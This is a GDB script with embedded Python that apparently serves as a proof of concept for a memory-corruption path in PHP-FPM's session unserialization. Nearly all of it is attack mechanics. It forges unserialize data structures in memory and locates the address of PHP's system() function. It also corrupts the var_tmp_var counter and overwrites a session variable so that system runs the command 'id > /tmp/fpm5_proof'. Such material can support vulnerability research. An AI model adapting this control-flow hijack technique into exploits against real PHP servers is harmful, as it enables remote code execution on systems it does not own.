set pagination off
set confirm off
set breakpoint pending on
set follow-fork-mode child
set detach-on-fork on
set logging file /tmp/fpm-fire.log
set logging overwrite on
set logging enabled on
set $zif = 0
set $psaddr = 0

break php_var_unserialize_init
commands
silent
set $lvl = *(unsigned int*)((char*)&basic_globals+0x370)
set $d = *(void**)((char*)&basic_globals+0x368)
printf "INIT level=%u data=%p\n", $lvl, $d
if $lvl != 0 && $d != 0
  set *(void**)((char*)$d+0x08) = (char*)$d + 0x3000
  set *(void**)((char*)$d+0x10) = (char*)$d + 0x3000
  set *(long*)((char*)$d+0x3000) = 1
  set *(void**)((char*)$d+0x3008) = 0
  set *(void**)((char*)$d+0x3010) = (char*)$d + 0x3100
  set *(unsigned int*)((char*)$d+0x3018) = 0x107
  set *(unsigned int*)((char*)$d+0x301c) = 0
  set *(unsigned long*)((char*)$d+0x3100) = 0x0000000700000001
  set *(unsigned long*)((char*)$d+0x3108) = 0xfffffff800000010
  set *(void**)((char*)$d+0x3110) = (char*)$d + 0x3120
  set *(unsigned long*)((char*)$d+0x3118) = 0x0000000100000001
  set *(unsigned long*)((char*)$d+0x3120) = 8
python
import gdb

def _find_zif():
    eg = int(gdb.parse_and_eval("&executor_globals"))
    print("EG %#x" % eg)
    inf = gdb.selected_inferior()
    def q(a):
        return int.from_bytes(inf.read_memory(a, 8), "little")
    ft = q(eg + 456)
    print("FT %#x" % ft)
    try:
        ps = int(gdb.parse_and_eval("&ps_globals"))
        gdb.execute("set $psaddr = (void*)%#x" % ps)
        z = ps + 0x168
        ref = q(z)
        ht = q(ref + 8)
        print("PS %#x Z %#x REF %#x HT %#x PD %#x" % (ps, z, ref, ht, q(ht + 0x30)))
    except Exception as e:
        print("PSERR %s" % e)
    try:
        zv = int(gdb.parse_and_eval("((void*(*)(void*, const char*, unsigned long))zend_hash_str_find)((void*)%#x, \"system\", 6)" % ft))
        print("ZV %#x" % zv)
        if zv:
            fn = q(zv)
            zif = q(fn + 0x58)
            print("ZIF_DIRECT fn=%#x zif=%#x" % (fn, zif))
            gdb.execute("set $zif = (void*)%#x" % zif)
            return True
    except Exception as e:
        print("DIRECTERR %s" % e)
    try:
        ar = q(ft + 0x10)
        n = int.from_bytes(inf.read_memory(ft + 0x18, 4), "little")
        print("AR %#x N %d" % (ar, n))
        if 0 < n < 20000:
            blob = bytes(inf.read_memory(ar, min(n, 20000) * 32))
            j = blob.find(b"system")
            if j != -1:
                print("FOUNDSTR off=%#x bucket=%d" % (j, j // 32))
            for i in range(min(n, 3)):
                b = ar + i * 32
                key = q(b + 24)
                try:
                    raw = bytes(inf.read_memory(key, 0x30))
                except Exception:
                    raw = b""
                print("B%d key=%#x raw=%s" % (i, key, raw.hex()))
            for i in range(n):
                b = ar + i * 32
                for ko in (8, 16, 24):
                    key = q(b + ko)
                    if key == 0:
                        continue
                    try:
                        ln = int.from_bytes(inf.read_memory(key + 0x10, 8), "little")
                        if ln != 6:
                            continue
                        if bytes(inf.read_memory(key + 0x18, 6)) != b"system":
                            continue
                        fn = q(b)
                        zif = q(fn + 0x58)
                        print("ZIF_SCAN bucket=%d ko=%d fn=%#x zif=%#x" % (i, ko, fn, zif))
                        gdb.execute("set $zif = (void*)%#x" % zif)
                        return True
                    except Exception:
                        continue
    except Exception as e:
        print("SCANERR %s" % e)
    return False

if not _find_zif():
    print("ZIF_SCAN failed")
else:
    gdb.execute("set *(void**)((char*)$d+0x3130) = (void*)$zif")
end
  set *(unsigned int*)((char*)$d+0x314c) = 1
  set *(void**)((char*)$d+0x3170) = (char*)$d + 0x3180
  set *(unsigned int*)((char*)$d+0x3178) = 0x06
  set *(unsigned int*)((char*)$d+0x317c) = 0
  set *(unsigned long*)((char*)$d+0x3180) = 0x0000000600000001
  set *(unsigned long*)((char*)$d+0x3188) = 0
  set *(unsigned long*)((char*)$d+0x3190) = 22
  set {char[23]} ((char*)$d+0x3198) = "id > /tmp/fpm5_proof"
  printf "FIRE d=%p first=%p last=%p data0=%p array=%p\n", $d, *(void**)((char*)$d+0x08), *(void**)((char*)$d+0x10), *(void**)((char*)$d+0x3010), (char*)$d+0x3100
  x/8gx (char*)$d+0x3100
end
continue
end

break var_tmp_var
commands
silent
set $vh = (void**)$rdi
set $d = *$vh
if $d != 0
  set $dt = *(void**)((char*)$d+0x10)
  if $dt != 0 && $psaddr != 0
    set $ps = (char*)$psaddr
    set $zref = *(void**)((char*)$ps+0x168)
    set $ht = *(void**)((char*)$zref+8)
    set $tgt = (char*)$ht+0x30
    set $used2 = ($tgt - (char*)$dt - 16)/16
    if $used2 < 0
      set *(long*)$dt = $used2
      printf "RETARGET ht=%p tgt=%p dt=%p used=%ld\n", $ht, $tgt, $dt, $used2
    end
    printf "TMP d=%p dt=%p used=%ld target=%p\n", $d, $dt, *(long*)$dt, (char*)$dt+16+16*(*(long*)$dt)
  end
end
continue
end

break php_set_session_var
commands
silent
set $rv = (void**)$rsi
set $cur = *$rv
if $cur != 0
  set *(long*)$cur = $zif
  printf "SETSV rv=%p cur=%p zif=%p\n", $rv, $cur, $zif
end
continue
end

break php_var_unserialize_destroy
commands
silent
printf "DESTROY d=%p level=%u\n", (void**)$rdi, *(unsigned int*)((char*)&basic_globals+0x370)
continue
end

break _zend_bailout
commands
silent
set $d = *(void**)((char*)&basic_globals+0x368)
printf "BAILOUT level=%u d=%p\n", *(unsigned int*)((char*)&basic_globals+0x370), $d
bt 4
continue
end

run
printf "=== inferior stopped ===\n"
bt 8
info registers rip rdi rsi
